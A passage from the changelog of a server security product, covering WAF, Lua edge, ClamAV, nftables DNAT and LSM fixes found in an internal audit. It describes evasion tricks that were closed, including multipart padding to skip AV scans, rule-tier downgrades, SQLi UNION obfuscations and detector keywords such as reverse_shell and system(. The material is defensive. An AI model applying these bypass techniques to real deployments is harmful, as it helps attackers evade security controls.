  lines with `bufio.ReadString('\n')`, whose comment wrongly claimed a 256 KB
  bound. `ReadString`/`ReadBytes` accumulate an un-delimited stream **without
  bound** (the reader buffer only limits a single fill), so any cfm-group sender —
  a compromised or simply buggy worker — could stream newline-free data and OOM
  the daemon. The reader now uses `ReadSlice`, which returns `ErrBufferFull` past
  the 256 KB buffer; an oversized line is dropped and ingestion resyncs at the
  next newline (memory bounded, connection kept alive), and a single line that
  floods past 8 MB closes the connection. Dropped oversized lines are counted and
  logged (throttled). Found by the 2026-07 edge Lua audit (F26). _(The file
  tailer `internal/detectors/core/source.go` has the same latent `ReadString`
  pattern with dead `ErrBufferFull` handling — tracked separately.)_
- **ClamAV upload scan no longer blinded by a padded multipart body (F17).** The
  Lua ClamAV lane decided whether a multipart POST carried a file to scan by
  substring-matching `filename=` in `ngx.ctx.waf_body` — the WAF's first
  `waf_body_max_len` bytes (32 KB), which is also **absent** when the WAF skipped
  the body read (a body over its Content-Length gate). An attacker could prepend a
  large non-file form field so the `filename=` landed **past the cap**, making
  `has_file_part()` return false and the upload evade the AV scan entirely (the
  Go bridge scans whatever body file it's handed, so the whole gate lived in Lua).
  The decision (`wants_scan`) now **fails safe**: if the inspected view shows no
  file part but the real body has bytes beyond it (nginx spooled it to disk),
  scan anyway — the scan always covers the full spooled body, so a file part
  beyond the cap is still caught. A genuinely small, fully-inspected multipart
  with no `filename=` still stays in the WAF lane only (no wasted scan), so the
  "scan only real uploads" resource posture is preserved for common
  admin-ajax/FormData. Normal uploads (file field first, `filename=` in the first
  bytes) already hit the fast path and are unchanged, but this **does** add new
  scans on file-hosting boxes: the padding-evasion case, large non-file multipart,
  and — a coverage gain — uploads the WAF skipped entirely (body over its 1 MB
  Content-Length gate, or chunked) that were **never** scanned before. Each spooled
  scan copies the full body first, so watch ClamAV load after upgrade; a body-size
  cap before enqueue is a sensible follow-up (there is none today). The `filename=`
  match is now fully case-insensitive (`FILENAME=`/`FileName=`), closing a small
  in-memory evasion. Found by the 2026-07 edge Lua audit (F17).
- **Revived the dead base64 PHP-object-injection WAF sub-rule (F13, rule 304).**
  The `B64_OBJ_INJECT` check in the base64 POST-body scanner tested a Lua
  `%bo%:%d+%:"` / `%bc%:%d+%:"` pattern. Lua's `%b` takes the **two bytes after
  it** as balanced delimiters, so `%bo%` asked for a balanced `o`…`%` run — and a
  decoded serialized object (`o:8:"stdclass"`) contains no `%`, so the sub-rule
  matched nothing and was **effectively off**. It now matches frontier-anchored
  serialized-object headers `o:<len>:"` / `c:<len>:"` (objects and custom-serialized
  objects; **not** `a:<len>:{` arrays — legit payloads carry arrays and only object
  `unserialize()` triggers POP chains). The `%f[%a]` frontier requires the marker
  to **start a token**, so a word ending in o/c like `foo:12:"bar"` can't
  false-match. Because this sub-rule was dead, reviving it straight into rule 304's
  `challenge` tier could FP-challenge apps that `base64(serialize($obj))` into a
  POST body, so `B64_OBJ_INJECT` **burns in at `logonly`** (visibility, no
  enforcement) — a per-tag split mirroring the F11 rule-438 burn-in; promote to
  `challenge` after watching the hit-rates. To keep that lower tier from being
  abused, the object tag is a **deferred, lowest-priority fallback** in the
  detector: a hostile sibling (`eval(`/`system(`/`union select`/…) anywhere in the
  body — same candidate or a later one — always wins first and keeps rule 304's
  configured tier, so an attacker cannot prepend a serialized-object marker to
  downgrade a base64'd `system()`/`union select` from challenge/block to logonly.
  Found by the 2026-07 edge Lua audit (F13).
- **sslcollector socket now self-heals and no longer orphans itself on restart
  (F27/F28).** The unix socket that serves TLS cert+key material to the edge
  workers had two latent ways to go silently down for the daemon's life — on a
  DNAT'd edge that means workers fall back to stale-snapshot or self-signed
  certs. **(F28, self-heal):** if `ServeSock` returned any error — most
  realistically a **transient bind failure at startup** (a stale socket, a
  not-yet-ready parent dir, `EADDRINUSE`) — the goroutine just logged and exited,
  but the lifecycle's no-change guard still saw `cancel != nil` and early-returned
  on every later tick, so the socket was **never respawned**. The guard now keys
  on actual liveness, and an unexpected exit is respawned on a later tick with
  bounded exponential backoff (5s→5m, reset on a healthy tick; a config change is
  never throttled). **(F27, restart race):** `net.Listen("unix")` defaults
  `UnlinkOnClose=true`, so during a config-change restart the *old* listener's
  `Close()` could `unlink()` the **new** listener's socket by name (if the new
  bind won the race), leaving the new server listening on an fd with no
  filesystem entry — every worker dial got `ENOENT` until the next restart. The
  listener now sets `SetUnlinkOnClose(false)` (the existing `os.Remove` owns
  stale-file cleanup; disable/shutdown remove the name explicitly). The lifecycle
  state machine is now mutex-guarded and race-clean under `go test -race`. Found
  by the 2026-07 edge Lua/OpenResty audit (F27, F28).
- **sslcollector generated-Lua token files are now crash-durable and always
  valid LuaJIT (F54/F55).** The generated `cfm_token.lua` / `cfm_bridge_token.lua`
  authenticate the edge workers to the collector and bridge sockets; a bad file
  → 403 on every `/cert` and `/dumpall` → cert-delivery outage. **(F54,
  durability):** the shared atomic Lua-file writer did `WriteFile(tmp)` + `rename`
  with **no `fsync`**, so power loss between the rename becoming durable and the
  data reaching disk could leave a present-but-empty/truncated token file after
  reboot. It now `fsync`s the temp file before the rename (matching the snapshot
  writer) — fixing durability for all four generated Lua files (token,
  sslcollector-config, clamav-config, bridge-config) at once, since they share
  this writer. **(F55, valid LuaJIT):** an operator-supplied token was accepted
  verbatim if ≥32 chars and emitted via Go `%q`; a non-printable non-ASCII rune
  (e.g. a pasted zero-width space) renders as `\uXXXX`, which LuaJIT cannot parse
  → the token file fails to compile and edge↔collector/bridge auth breaks. Tokens
  are now required to be graphical ASCII (`0x21–0x7e`); a token that isn't is
  treated as weak and regenerated (the generated 48-hex token is always safe).
  Applied to both the sock token and the generic key form (`OPENRESTY_TOKEN`,
  which is itself emitted to `cfm_bridge_token.lua`). Found by the 2026-07 edge
  Lua/OpenResty audit (F54, F55).
- **sslcollector TLS handshake hot path: cache parsed certs + rate-limit the
  cache-miss log (F19/F43).** `ssl_certificate_by_lua` runs on every full TLS
  handshake. **(F19, perf):** the worker cert store held raw PEM, so `set_cert`
  called `parse_pem_cert` + `parse_pem_priv_key` (PEM→DER + key parse — one of
  the costliest per-handshake ops) on *every* connection, even though certs
  change ~hourly. The PEM is now parsed once at ingest (`store_pair`) and the DER
  cdata cached on the entry; the handshake path just reuses it. A cert that won't
  parse is dropped at ingest (logged once) instead of re-failing per handshake.
  **(F43, DoS):** every unmatched SNI logged one synchronous `error_log` WARN,
  with no throttle — an attacker opening TLS connections with random SNIs could
  fill the disk / contend I/O on the handshake path. The miss log is now
  worker-rate-limited (≤1 line per 10s, with a coalesced suppressed count), and
  the attacker-supplied SNI is length-bounded + sanitized on the logged line.
  Cert selection still fails safe to the static default cert. Found by the 2026-07
  edge Lua/OpenResty audit (F19, F43).
- **DNAT/panel scoped accepts were appended AFTER the default drop (and
  duplicated) — DNAT'd web/panel traffic was dropped unless the listener ports
  were in `TCP_IN`.** `ensureScopedDNATAccepts` / `EnsurePanelDNATAccepts` (nft
  backend) listed the input chain with `nftOut("-a list chain inet cfm input")`,
  but `nftOut` feeds its argument to `nft -f -` (script mode) where the `-a`
  handle flag is a **syntax error**. The listing therefore failed and the error
  was discarded, so: (1) the default-drop handle was never found and the scoped
  `ct status dnat` accepts were **appended after** the drop (never matched), and
  (2) the "does this accept already exist" cleanup matched nothing and **piled
  up duplicate** accept rules on every reload. Net effect on cPanel/Imunify boxes
  with `cfm dnat on` / `cfm dnat cpanel on`: only allowlisted (`allow_dyn`) IPs
  could reach the site; everyone else was dropped — masked only by listing
  `9080/9043/12082..` in `TCP_IN`. Fixed by listing via `ListChainText` (argv
  mode) in all five affected call sites (`ensureScopedDNATAccepts`,
  `cleanupScopedDNATAccepts`, `EnsurePanelDNATAccepts`, `RemovePanelDNATAccepts`,
  `PanelDNATAcceptState`) and failing closed on a list error instead of silently
  appending. You no longer need the DNAT listener ports in `TCP_IN`. Regression
  tests: `TestDNATOnPlacesAcceptsBeforeDefaultDrop` (live-nft, gated by
  `CFM_NFT_INTEGRATION=1`) and `TestNftOutIsNeverCalledWithCLIFlags` (source
  guard). Review hardening on the same change: `nftOut` now rejects a
  leading-dash arg at runtime (the flag-in-script-mode footgun that caused the
  bug); the default-drop matcher and the redirect-port parser were consolidated
  into `internal/firewall/dnat_accepts.go` (single source of truth for the nft
  backend and the dnat CLI, previously copy-pasted in 3-4 spots); `cfm dnat`
  status now resolves accepts against the ports actually installed in
  `cfm_redirect` (not the CLI/env default) so a custom-port box no longer shows
  false `ABSENT`; and `PanelDNATAcceptState` became placement-aware (an accept
  stranded after the drop reports `blocked`, not `open`).
- **Socket-ingest-only boxes: forced-vhost challenge (and all webdetector
  challenge/block emission) never ran.** When the webdetector ingests via the
  Unix socket (`/run/cfm/ingest.sock`, fed by the OpenResty/Angie edge) and the
  configured `LOG_PATH` file does not exist, `webdetector_register` never
  attaches a file source, so `Engine.src` is nil. `RunOnce` returned at its
  `if e.src == nil { return nil }` guard **before** the periodic reconcile —
  and that reconcile (`emitIPChallenges` / `emitIPBlocks`) is the *only* place
  the `CHALLENGE_VHOST` list, per-IP challenges, and autoblocks are pushed to
  the edge. Net effect on a socket-only server: the forced list loaded fine but
  `/nginx/status` showed `active_vhosts: []` and `cpanel.*`/`webmail.*`/`whm.*`
  were never challenged, even though scoring/history (socket-fed) and the
  in-path WAF (independent) both worked — so it looked like a config mistake.
  `RunOnce` now drains the file source only when one is attached and **always**
  runs the reconcile, so the socket is a first-class standalone source (as it
  already is for `cfm webtop` and the WAF). A transient `Open()` failure (e.g. a
  log mid-rotation) likewise no longer skips the reconcile — but the tail
  resume-offset is now persisted **only after a clean drain** (`srcDrained`
  guard), so an Open/read failure can't overwrite the saved offset with a
  zeroed `Position()` and make recovery seek-to-end and skip lines. Regression
  tests: `TestRunOnce_SocketOnlyStillPushesForcedVhosts`,
  `TestRunOnce_OpenFailureDoesNotClobberSavedOffset`. Workaround on older
  builds: `touch` the `LOG_PATH` file so a source attaches.

### Changed
- **WAF: the three SQLi rules share one SQL-comment strip per scan surface
  (F30b).** `detect_sqli`, `detect_sqli_blind_lexical` and
  `detect_sqli_union_variant` each independently recomputed `sqli_scan_strings`
  (`strip_sql_comments` + a `+`/whitespace collapse) on the same scan string —
  3× per surface, and the engine scans both the URI+query and args+body
  surfaces, so **6× per request**. The comment-strip pair is now computed by two
  memoized engine getters (`get_sqli_ua` / `get_sqli_ab`, mirroring the existing
  `get_scan_ua`/`get_norm_ab` memoization) and passed into the detectors, which
  take the `(sc, scw)` pair directly — **2 strips per request instead of 6**
  (1 for a body-less GET). Saves ~1.1 ms/req (~8.5%) on a large ~8KB URI+body
  SQLi surface; negligible on normal short requests. Detection is byte-identical
  (the strings are the same, just computed once). Follow-up to F30, which
  widened the scan surface and made the redundancy more visible. Found by the
  2026-07 edge Lua audit (F30b, low).
- **UA-emergency: move the periodic rule-file read off the request hot path (F48).**
  `cfm_ua_emergency.check()` runs on every request and called `refresh_if_needed()`,
  which every `REFRESH_INTERVAL_SEC` (3s) per worker did a blocking `io.open` +
  full `read` + string-compare of `/var/lib/cfm/ua_emergency.json` **in the access
  phase** — and the module header falsely claimed it stat'd mtime (it does a
  content compare; Lua has no stat without `lfs`). The first load per worker is
  still synchronous (so the very first request is checked against any emergency
  rules — no cold-start bypass on this security surface), but every later refresh
  now runs in a background `ngx.timer.at(0)` (the `cfm_h3_config` pattern) while the
  request keeps serving the current in-memory rules; a dedupe flag stops concurrent
  requests from stacking timers. Convergence latency is unchanged (≤ 3s across the
  pool). The misleading comment is corrected. Found by the 2026-07 edge Lua audit
  (F48).
- **WAF: cache the exclude glob→pattern conversion per rule (F32).** For every
  glob exclude row (`*`/`?`), `matches_rule` rebuilt the anchored Lua pattern (two
  gsubs over the rule) on every WAF-eligible request — once per host row and once
  per path row — where Go compiles its regexp once at rebuild. `glob_to_lua_pattern`
  now caches the pattern in a module-scope table keyed by the rule string. The keys
  are exclude **rules** (a bounded operator list), never request values, so the
  cache can't grow with traffic; it persists per worker and is naturally superseded
  when a rule changes (a changed rule is a new key). Behavior-neutral — the
  conversion is a pure function of the rule, so a cache hit returns a byte-identical
  pattern. Found by the 2026-07 edge Lua audit (F32).
- **WAF: memoize the per-request args-normalize and body-lowercase once, shared
  across detectors (F58 + F59).** Each WAF request re-did the same string work in
  several detectors: `normalize(cap(args, max_scan_len))` (double-URL-decode +
  lowercase) was recomputed by `detect_cmd_param_key`/`cmd_payload`/
  `debug_toggles`/`php_serialize`/`bad_utf8` (F58), and `lower(cap(body,
  max_scan_len))` was rebuilt by the five RCE-marker detectors
  (`reverse_shell`/`persistence`/`rootkit_artifacts`/`lolbin`/`coinminer`, F59) —
  up to ~6× and 5× the necessary allocations over the same strings on every
  request. `cfm_waf.lua`'s `check` now computes each once via lazy getters
  (`get_norm_args()` / `get_body_lc()`, mirroring the existing
  `get_scan_ua()`/`get_norm_ab()` memos) and passes them into those detectors,
  which use the precomputed value when given and fall back to computing it
  otherwise. Behavior-neutral by construction — the memo is byte-identical to
  each detector's own computation (same `CFG.max_scan_len`), so results are
  unchanged; only the redundant recomputation is removed. Found by the 2026-07
  edge Lua audit (F58, F59).
- **WAF: skip the xmlrpc legit-check normalize on non-xmlrpc requests (F24).**
  `is_known_legit_xmlrpc` (the Jetpack carve-out, called on the WAF hot path for
  every request via `cfm_waf.lua` sections 26 & 28) normalized both the args and
  the body — a double-URL-decode + lowercase + cap — **before** checking whether
  the URI was even `/xmlrpc.php`, wasting that work on the ~99% of requests that
  aren't xmlrpc. The `/xmlrpc.php` URI gate now runs first, short-circuiting
  before the normalize. Pure reordering — identical result for every request,
  just cheaper on the common path. Found by the 2026-07 edge Lua audit (F24).
- **`cfm dnat` now reports the scoped listener-port accepts (web scope).**
  `cfm dnat on` DNATs `80→:9080` / `443→:9043` and installs scoped
  `ct status dnat` accepts in `inet cfm/input` so the redirected traffic reaches
  the edge **without** `9080/9043` in `TCP_IN` — but the web path did this
  silently, so an operator whose site was unreachable after `cfm dnat on` had no
  way to tell a missing CFM accept from an upstream drop. `cfm dnat on` now
  prints a `Firewall: opened scoped 80->9080 tcp (nft cfm/input)` line per mapping
  (parity with `cfm dnat cpanel on`) and warns loudly when a mapping is absent or
  landed after the default drop; `cfm dnat` status gains a **Scoped DNAT
  accepts** block reporting each mapping as `open` / `BLOCKED` / `ABSENT`. When
  all read `open` but a non-allowlisted client still can't connect, the drop is
  upstream (external CSF/Imunify `INPUT` filtering the listener port, or an edge
  bound to `127.0.0.1` only) — see `docs/dnat-bypass.md`. No change to the
  firewall rules themselves.
- **Reference `detectors.conf` ships a sane cPanel forced-challenge default and
  drops leaked customer hosts.** `CHALLENGE_VHOST` now defaults to
  `webmail.*, whm.*, cpanel.*` (force-challenge the cPanel/WHM/webmail service
  subdomains — high-value on cPanel boxes, inert elsewhere) instead of the
  `victim.com` placeholder. `CHALLENGE_VHOST_IGNORE` / `CHALLENGE_HOST_BYPASS`
  are now **empty** — the shipped reference previously carried real
  customer/operator hostnames (`api.mybank.gr`, `stereotiki.gr`, `ndnodo.com`,
  `*.e-nautilia.gr`, …), which would apply one operator's exclusions/bypasses on
  every install. These are operator-specific and must be set per host.

### Added
- **`cfm health` edge section: TSV access-log and origin real-IP visibility.**
  Two new read-only lines under "Web stack - Edge Interceptor", to make a fresh
  edge setup self-diagnosing:
  - **TSV access log** — reads `[webdetector] LOG_PATH`, then reports whether the
    file exists and is *filling* (write-recency + size shown as context only —
    the file's mtime is the producer's signal, not the ingest consumer's health,
    so a quiet vhost that writes nothing is never flagged). It warns only on
    unambiguous faults: the path is not a regular file, or it is absent while the
    ingest socket is also not live (no ingest source wired at all). Never
    false-alarms on socket-only or idle boxes.
  - **Origin real-IP** — detects the origin stack (Apache / LiteSpeed / nginx,
    cPanel + DirectAdmin/plain paths) and checks that 127.0.0.1 is trusted as a
    real-IP proxy (`RemoteIP{Internal,Trusted}Proxy` for Apache, LiteSpeed's
    native `useIpInProxyHeader`, `set_real_ip_from` for nginx). Warns — with the
    concrete consequence ("access logs will record 127.0.0.1, not client IPs")
    — when the trust directive is missing. Purely diagnostic; changes nothing.
    The stack is resolved from on-disk install markers, not blindly from the
    collector's upstream hint, so an OpenResty box (the edge is nginx-based) is
    no longer misreported as an "nginx" origin when the real origin is LiteSpeed
    or Apache. The collector now also recognizes the current `litespeed` process
    name (not just the older `lshttpd`).
- **`cfm.api.conf` overlay now carries MaxMind credentials too, plus a shipped
  `cfm.api.conf.example`.** The per-server secrets overlay
  (`LoadConfigWithAPIOverride`) already overrode the cfm-web API `API_URL` /
  `AUTH_TOKEN`; it now also overlays `MAXMIND_ACCOUNT_ID` / `MAXMIND_LICENSE_KEY`
  (only when the overlay sets them), so the base `cfm.conf` can ship secret-free
  and identical on every host while a single `/etc/cfm/cfm.api.conf` holds the
  API + MaxMind secrets. Ships `configs/cfm.api.conf.example` (all values empty,
  so an un-edited file is inert — no reporting redirected to a real endpoint,
  GeoIP falls back to IPLocate); the deb/rpm post-install seeds
  `/etc/cfm/cfm.api.conf` (0600) from it on first install only (never overwrites
  an existing file; it is not a tracked conffile). The overlay is read at daemon
  **startup**, so edits need a `systemctl restart cfm` (documented in the file
  header), not just a reload.
  Runtime tokens (`CHALLENGE_TOKEN` / `OPENRESTY_TOKEN` / `SSLCOLLECTOR_SOCK_TOKEN`)
  still auto-generate on first boot, so they never need to be in the overlay.
  Covered by `TestLoadConfigWithAPIOverride_MaxMindAndAPI` /
  `…_APIOnlyOverlayKeepsBaseMaxMind`.
- **Startup log line for the forced-challenge vhost list (`CHALLENGE_VHOST`).**
  The webdetector now echoes the panic/bypass lists at config-load time —
  `forced-challenge vhosts (CHALLENGE_VHOST) loaded: count=N list=…`, plus
  companion lines for `CHALLENGE_VHOST_IGNORE` and `CHALLENGE_HOST_BYPASS` when
  set — mirroring the existing `challenge exclude loaded` line. Previously the
  forced list produced **no** startup output: the per-host bridge push is lazy
  (a `[nginx_bridge] vhost_challenge host=… reason=vhost_config` line appears
  only once a host matching the pattern actually receives traffic), so on a
  freshly-restarted, idle server `grep vhost /var/log/cfm/*` came back empty and
  read as a misconfiguration even though the list was loaded and active.
- **cfm-lsm event enrichment, Tier B (BPF wire fields).** The LSM event now
  carries the caller's parent tgid (`ppid`) read in-kernel at the instant it
  fired, plus — for `CFML-OBS-004` — the ptrace target's pid and euid
  (`aux_pid`/`aux_uid`). Two operator-visible wins: (1) the parent launcher
  (cron/script/controller) is resolved from the event `ppid` even when the
  short-lived caller has already exited by drain time (previously `proc=gone`
  meant no parent, since userspace can't read a dead process's `/proc`); (2)
  OBS-004 alerts show `target_pid=`/`target_uid=` alongside the target comm, so
  an operator can tell exactly which process was introspected and whether a
  cross-uid target was root or another tenant. The event struct grew from 112 to
  124 bytes (fields appended after `filename`); `common.bpf.h`, `events.go`, and
  the regenerated `.o` objects move in lockstep, and the Go parser accepts the
  112-byte base as a floor so it stays correct against an older pinned build
  during the version-marker refresh window.
- **cfm-lsm event enrichment — actionable alerts + a self-preserving forensic
  trail.** Every LSM detection now carries a best-effort `/proc` snapshot of the
  offending process, gathered in the drain path within milliseconds of the event
  (before a short-lived caller exits), folded into the `cfm.log` line and the
  notify email: `user` (uid→name), the **real** `exe` path (+ `(deleted)` flag —
  `comm` is spoofable, the exe inode is not), **SHA-256** of the exe (VirusTotal-
  ready, works on unlinked binaries), `cwd`, `cmdline`, `ppid`+parent `comm`/`exe`,
  and `loginuid`. Two further layers: **`enrich_peers`** appends the *uid swarm
  roster* — every process sharing the caller's real uid with its pid/comm/real-exe,
  so a compromised account's whole set of spoofed-comm processes (all typically
  pointing at one dropped binary) is captured while those pids still exist; and
  **`enrich_capture`** copies suspicious binaries (already-deleted, or under
  `/tmp`,`/var/tmp`,`/dev/shm`,`/run`,`/home`) out of `/proc/<pid>/exe` into
  `capture_dir` (default `/var/lib/cfm/lsm/capture`, `<sha256>.bin`, root-only,
  never executed, deduplicated, bounded) so a self-deleting dropper is preserved
  for analysis. All four knobs live under `[events]` in `lsm.conf` and **default
  ON** (a pre-existing conf inherits them on upgrade — no edit needed). Snapshots
  are cached per caller pid and rosters per uid, so a burst does the `/proc` work
  (incl. hashing and the full scan) once.
- **cfm-lsm alert-flood fix (fold into the above).** For the ptrace sweep policy
  `CFML-OBS-004` — which fires once per (caller, target) pair as a `pgrep`-style
  tool walks `/proc` — the notify email *reason* is now caller-identity-stable
  (uid + comm + exe, no pid, no per-target `ptrace`/`sameuid` tag), so the existing
  notify deduper collapses a whole sweep into a **single email** instead of one
  per target (previously the target + pid were in the dedup key, so a sweep
  produced up to the per-policy cap in emails). The collapse is scoped to that
  sweep policy: discrete-action policies (`FS-005`, `CRED-002`, `EXEC-*`) keep one
  email per target and keep the target/pid in the notify JSONL audit. The
  per-target detail, swarm roster, and captured-binary references ride in the
  email's **Sample lines** and the `Extra` map; `cfm.log` keeps the full
  per-event line. Enrichment is also gated behind the per-policy rate cap (a
  rate-dropped event does no `/proc` work) and all emitted fields are sanitised
  against log/email injection.
- **Web detector observability:** per-IP / subnet challenge **issuance** is now
  logged to `cfm.challenges.log` as `[challenge_issued] ip=… host=… rule=… ttl=…`
  (gated by `ChallengeLog`, like every other `[challenge]*` line). Previously an
  *issued-but-unsolved* challenge left no greppable trace — that log only records
  **solves** (keyed by the solver), and vhost-wide trips log under `host=`, not
  the client IP — so `grep <ip> cfm.challenges.log` for a challenged-but-non-JS
  client (API integrations, prefetch proxies, scanners) came back empty and the
  reason lived only in the webdetector history. De-duplicated to one line per
  `(ip, rule)` window (refreshes while a challenge stays active don't re-log), so
  it's greppable without being noisy.

### Fixed
- **Packaging (.deb): six `/etc/cfm` config files were not registered as
  `conffiles`, so `dpkg` silently overwrote operator edits on every upgrade.**
  The `.deb` ships 16 files under `/etc/cfm`, but `debian/DEBIAN/conffiles`
  listed only 10 — a file under `/etc` that dpkg installs but that is *not* a
  conffile is treated as a regular file and **replaced unconditionally on
  upgrade** (no prompt, no `.dpkg-dist` backup). The six unprotected files were
  `webdetector_challenge_exclude.txt`, `webdetector_challenge_paths.txt`,
  `webdetector_malpaths.txt`, `cfm.ignore`, `cfm.dnat_bypass` and
  `cfm.dnat_cpanel_bypass` — all operator-tuned lists, so a Debian/Ubuntu
  upgrade wiped local customisations (e.g. a hand-edited challenge-exclude or
  DNAT-bypass list). The RPM already protects all 16 with `%config(noreplace)`;
  the six are now added to `conffiles` so the `.deb` matches — dpkg keeps the
  operator's version and parks the new default as `.dpkg-dist`. RPM users were
  never affected. (Verified: `conffiles` == the deb-staged `/etc/cfm` set ==
  the RPM `%config` set — 16 each.)
- **Edge → bridge RPC (`cfm.lua`):** removed a ~300 ms stall on every edge→daemon
  call that returns an empty body (`Content-Length: 0`) — the WAF autoblock
  **push** and the block/clear calls (`/nginx/ip`, `/nginx/vhost`). (`observe`
  and `ok-touch` return a small JSON body, so they were never affected.)
  `http_unix` read the response body with a fall-through `receive("*a")`, which
  on the keep-alive
  bridge socket blocks until the read timeout (`CFM_DECISION_TIMEOUT_MS`, default
  300 ms) because the daemon never closes the connection; an explicit
  `Content-Length: 0` is now short-circuited to an empty body. Under a
  WAF-tripping flood each distinct `(ip, reason)` push tied up an nginx worker
  light-thread for ~300 ms of blocked time — the source of the intermittent "lua
  tcp socket read timed out" seen under only modest load. No behaviour change for
  non-empty responses (decision JSON, chunked). Found by the 2026-07 edge Lua
  audit (F04).
- **WAF (rule 606, `WAF_HTTP_SMUGGLING`, logonly): the request-line-smuggling
  detector never fired.** It was doubly dead: the verb match used
  `sl:match("(get|post|…)…")` (Lua has no `|` alternation, so it matched the
  literal string), AND the pre-filter tested the raw string for lowercase
  `" http/"` while a smuggled request line is normally uppercase
  `"GET … HTTP/1.1"`. The string is now lowercased first, then each known method
  is tested at a word boundary (`%f[%a]verb%s+[^%s]+%s+http/%d`). Stays
  **logonly** (observe-only). Covered by
  `scripts/tests/cfm_waf_backtick_smuggling_test.lua`. Found by the 2026-07 edge
  Lua audit (F12).
- **Web detector:** machine-to-machine API endpoints are no longer caught by a
  *vhost-wide* challenge. When a vhost trips the auto-suspicious-vhost score
  (`CHALLENGE_SUSPICIOUS_VHOST_SCORE` / `CHALLENGE_VHOST`), **every** request to
  the host was challenged regardless of path — silently breaking non-browser
  integrations that cannot solve the JS challenge (e.g. the v-track WooCommerce
  order sync: `/wp-json/wc/v3/orders/` got the HTML challenge instead of JSON
  during each ~35-min auto-on window, so orders stopped syncing intermittently).
  The `/nginx/decision` handler now exempts a **narrow, high-confidence** set
  from the vhost-wide challenge — WooCommerce REST (`/wp-json/wc*`, `/wc-api/`),
  payment-gateway webhooks/IPN, and the `/ws_vtrack/` plugin path. Deliberately
  much tighter than the score-exemption list (`isMachineStyleEndpointGo`), and
  applied **only** when the IP itself is not individually challenged/blocked —
  per-IP autoblock and the WAF rule engine still inspect these paths, so an
  attacker on them is still caught. Matching is substring (tolerates WP/Woo
  installed under a path prefix and the `//` form the edge forwards) with a
  path-traversal guard (`..` / `%2e` fail closed), so a token can't be decorated
  to slip a request that resolves to a different origin target past the challenge. (The reason was only visible via the
  `[challenge][vhost] action=auto_on host=…` line — keyed by host, not client
  IP — which is why a `grep <ip>` of the CFM logs came back empty.)

### Added
- Reference **challenge-exclude** ships a *VPN by Google / Chrome prefetch-proxy*
  entry (`configs/webdetector_challenge_exclude.txt`, section 9). Shared-egress
  `/24`s under `*.googlezip.net` (AS15169) were tripping the behavioural
  `CHALLENGE_SUBNET` heuristic — many real users behind one `/24` read as a
  scanner — and the non-JS prefetch proxy can never solve the interactive
  challenge, so it looped invisibly: an *issued-but-unsolved* challenge writes
  no `cfm.challenges.log` line (that log only records solves), and the reason
  lived only in the webdetector history as `challenge_issued reason=CHALLENGE_SUBNET`.
  Ships as two belt-and-suspenders rules (PTR+FCrDNS gold-standard, plus an
  ASN+PTR robust fallback). **Challenge-suppression only** — the WAF rule engine
  (SQLi/RCE/upload/webshell → 403) stays fully armed for these IPs.
- WAF rule **319 `rule_sqli_union_variant`** (`WAF_SQLI_UNION_VARIANT`) at
  **`logonly`** — observe-only detection of obfuscated UNION injection that
  rule 301's *adjacent* `union select` match misses: `union all select`,
  `union distinct select`, `union(select`, and comment-collapsed forms
  `union/**/select` → `unionselect` and `union/**/all|distinct/**/select` →
  `unionallselect`/`uniondistinctselect`. Runs on the same comment-stripped,
  `+`/whitespace-collapsed scan string as 301 and carries the identical
  value-terminator guard (the `union` must follow a value break `[%d'"%)]` or
  a `null`/`true`/`false` operand), so legit prose like *"credit union all
  selected"* / *"european union distinct selection"* does not fire. Shipped
  `logonly` for a multi-day real-traffic burn-in before any promotion; the
  `waf_security` autoblock family stays un-armed (default `0`) while logonly.
  Go registry (`waf_rule_ids.go`) and Lua (`cfm_waf.lua`) mirror the new rule;
  covered by `TestWAFSecurityFamilyCoverage` and
  `scripts/tests/cfm_waf_sqli_test.lua` (7 TP obfuscated-UNION + FP prose
  negatives). Found by the 2026-07 edge Lua audit.

### Security
- WAF / challenge excludes: **a non-glob host or path exclude no longer matches
  by plain substring**, which silently disabled protection on unintended
  vhosts/paths. Both the log-driven Go matcher
  (`internal/webdetector/exclude_store.go` `compiledValueMatcher`, which used
  `strings.Contains`) and the in-path Lua matcher (`cfm_waf_excl.lua`
  `matches_rule`, which used `value:find`) meant a `shop.gr` **host** exclude
  also switched the WAF/challenge off for `myshop.gr`, `shop.gr.evil.com`,
  `evil-shop.gr`, and a `/api` **path** exclude covered `/therapy`. Non-glob
  values now match at a boundary, identically in Go and Lua: a host matches
  **exactly or as a dot-boundary subdomain** (`shop.gr` → `shop.gr`,
  `www.shop.gr`; NOT `myshop.gr` / `shop.gr.evil.com`) and a path **exactly or
  as a path-segment prefix** (`/admin` → `/admin`, `/admin/x`; NOT
  `/administrator`). Globs (`*`/`?`) are unchanged. The host semantics now agree
  with `matchHostExclude` (the reporting-side matcher the enforcement path had
  silently diverged from). **Behaviour change for existing excludes**: a
  substring-reliant entry (e.g. `shop` to cover `shop.gr`+`myshop.gr`, or
  `/admin` to cover `/administrator`) must be re-expressed as a glob (`*shop*`,
  `/admin*`) or listed explicitly. The Lua matcher moved to `cfm_waf_excl.lua`
  for unit-testability; Go and Lua are cross-checked to agree. Found by the
  2026-07 edge Lua audit.

### Fixed
- WAF (rule 604, `WAF_CT_ANOMALY:CT_CHARSET_BYPASS`, challenge): **stopped
  challenging legitimate non-Latin form/API POSTs.** The Content-Type charset
  allowlist — which exists to flag a charset the WAF can't decode but the
  backend can (EBCDIC/IBM037, UTF-7, UTF-16), a real evasion vector — held only
  Latin + Chinese, so a Greek (`iso-8859-7`, `windows-1253`) or any other
  national-charset POST was challenged (rule 604). The allowlist now admits any
  **ASCII-superset** charset — the only property that matters here, since the
  exploit metacharacters `< > ' " ( ) ;` live in 0x00–0x7F and map to ASCII
  unchanged, so the WAF and the backend see identical bytes: every `iso-8859-*`
  and `windows-125x` national charset (Greek, Cyrillic, Hebrew, Arabic, Turkish,
  Baltic, Vietnamese), KOI8, TIS-620, and the ASCII-compatible CJK multibyte
  encodings (shift_jis/big5/euc-*). EBCDIC, UTF-7 and UTF-16/32 stay flagged, as
  do unknown charsets (fail-safe allowlist) — verified old-vs-current. The
  charset value is now also read from a **quoted** form (`charset="ibm037"`), so
  a dangerous charset can no longer dodge the check by quoting, and the capture
  accepts `_` so `shift_jis`/`ks_c_5601-1987` are recognised. Found by the
  2026-07 edge Lua audit.

### Security
- WAF (rule 401, `WAF_UPLOAD_FNAME`, block + autoblock): **closed four upload
  webshell bypasses in Content-Disposition filename extraction.** (1) The
  filename was extracted with a case-SENSITIVE `[Ff]ilename` token, but the
  parameter name is case-insensitive (PHP's rfc1867 parser uses `strcasecmp`) —
